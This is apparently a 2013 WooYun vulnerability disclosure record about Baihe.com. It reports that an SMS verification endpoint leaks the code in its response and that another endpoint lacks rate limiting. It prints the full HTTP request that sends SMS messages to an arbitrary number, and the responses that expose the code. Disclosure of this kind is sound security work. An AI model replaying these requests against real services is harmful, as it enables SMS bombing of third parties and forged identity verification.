{"id": 61861, "wybug_id": "wooyun-2013-037816", "wybug_title": "百合网某逻辑缺陷可伪造认证信息以及短信炸弹", "wybug_corp": "百合网", "wybug_author": "路人甲", "wybug_date": "2013-09-23 14:06", "wybug_open_date": "2013-09-28 14:07", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-09-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-09-28：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 接口存在逻辑缺陷 详细说明：  1.验证码发送逻辑错误。http://auth.baihe.com/id5/sendAuthId5.action?authedFrom=0需要登录这个页面，注册时候的认证会跳到这个页面。这里获取短信验证码的时候返回的信息包含了验证码。这是其中一次的返回请求。HTTP/1.1 200 OKServer: Apache-Coyote/1.1X-Powered-By: Servlet_auth_j1_38Connection: closeContent-Type: text/json;charset=gbkContent-Length: 37Date: Mon, 29 Jul 2013 10:49:25 GMTjsonp1375094941686({\"pnum\":\"937830\"})黄圈圈是132条短信。。。验证码是937830手机比较弱，对不住了。。。这个接口是貌似是需要手机号是绑定了身份证号的，这样验证的才更可靠？猜测这样的。由于某些原因，没有用真实的身份证和手机测试。目测只要知道了对方的身份证号，对方用的通过认证的手机号码，就可以通过验证，伪造身份。在信息泄漏和各种诈骗从出不穷的时代，还是要做好防范～～2,该处接口没有对短信的发送次数做限制，所以可以对任意号码发送任意数量的短信。发送短信的请求为：POST /sendSmsForOtherProject.action?jsoncallback=jsonp1375094941686 HTTP/1.1Host: auth.baihe.comUser-Agent: Mozilla/5.0 (Windows NT 5.1; rv:22.0) Gecko/20100101 Firefox/22.0Accept: text/javascript, application/javascript, */*Accept-Language: en-gb,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://auth.baihe.com/id5/sendAuthId5.action?authedFrom=0Content-Length: 30Cookie: 。。。。。Connection: keep-alivePragma: no-cacheCache-Control: no-cachephoneNum=15388884444&oppKey=10phoneNum处为手机号，可以任意填写。   漏洞证明：  漏洞证明：HTTP/1.1 200 OKServer: Apache-Coyote/1.1X-Powered-By: Servlet_auth_j1_38Connection: closeContent-Type: text/json;charset=gbkContent-Length: 37Date: Mon, 29 Jul 2013 10:49:25 GMTjsonp1375094941686({\"pnum\":\"937830\"})   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2013-09-28 14:07 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}